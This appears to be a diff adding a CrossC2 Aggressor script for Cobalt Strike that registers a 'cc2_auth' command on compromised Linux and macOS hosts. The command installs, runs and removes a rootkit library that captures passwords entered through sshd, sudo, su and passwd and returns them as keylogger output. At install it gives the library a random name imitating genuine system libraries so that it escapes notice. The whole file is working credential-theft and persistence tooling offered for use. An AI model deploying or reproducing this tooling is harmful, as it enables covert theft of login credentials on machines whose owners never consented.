@@ -1,0 +1,69 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+sub printUsage_auth {
+    blog($1, "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n");
+}
+
+ssh_alias cc2_auth {
+    $taskName = "cc2_auth"; # taskName
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "keystrokes"; # keystrokes -> keylogger message
+
+    $beaconid = $1;
+    $arch = $2;
+    $chose = $3;
+    $realPatchName = $4;
+    $transportArg = "blankArg";
+
+    $patchlib = "rootkit/auth/auth_rootkit_module";
+    $loadlib = "rootkit/auth/auth_rootkit_mgr";
+    $removelib = "rootkit/auth/auth_rootkit_remove";
+    if ($arch eq "linux32") {
+        $patchlib = $patchlib."32.so";
+        $loadlib = $loadlib."32.so";
+        $removelib = $removelib."32.so";
+    } else if ($arch eq "linux") {
+        $patchlib = $patchlib.".so";
+        $loadlib = $loadlib.".so";
+        $removelib = $removelib.".so";
+    } else if ($arch eq "osx") {
+        $patchlib = $patchlib.".dylib";
+        $loadlib = $loadlib.".dylib";
+        $removelib = $removelib.".dylib";
+    } else {
+        berror($beaconid, "*[error]: Only Linux/MacOS is supported for now.");
+        printUsage_auth($beaconid);
+        return;
+    }
+    $patchName = "libk5ccrypto1.0.4.so";
+
+    if ($chose eq "install") {
+        $installPath = $4;
+        $authPath = $5;
+        blog($beaconid, "patch auth:");
+        $patchHead = @("pcre", "se", "kbr5", "k5c");
+        $patchBody = @("dl", "crypto", "resolv", "z");
+        $patchVer = @("1.0.1", "1.2.1.2", "1.0.1.3");
+        $patchEnd = ".so";
+        $patchName = "lib".$patchHead[rand(4)].$patchBody[rand(4)].$patchVer[rand(3)].$patchEnd;
+        blog($beaconid, "patch name: ".$patchName);
+        $patchArg = $patchName."^";
+        if ($installPath && $authPath) {
+            $patchArg = $patchArg.$installPath."^".$authPath;
+        }
+
+        bcrossc2_load_dyn($beaconid, "so", "cc2_auth_module", "info", $patchlib, $patchArg)
+    } else if ($chose eq "run") {
+        blog($beaconid, "get password for ssh login:");
+        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    } else if ($chose eq "uninstall") {
+        $installPath = $4;
+        bcrossc2_load_dyn($beaconid, "so", "cc2_remove_auth", "info", $removelib, $installPath."^");
+    } else {
+        berror($beaconid, "*[error]: step type");
+        printUsage_auth($beaconid);
+    }
+}
+
+ssh_command_register("cc2_auth", "CrossC2 auth rootkit - Get password for auth action(sshd/sudo/su/passwd...).", "\nUsage: cc2_auth <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for auth action(sshd/sudo/su/passwd...).\n\tstep: \t<install>, <run>, <uninstall>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. run: \tstart running ssh rootkit.\n\tstep 3. uninstall: \tuninstall ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n");
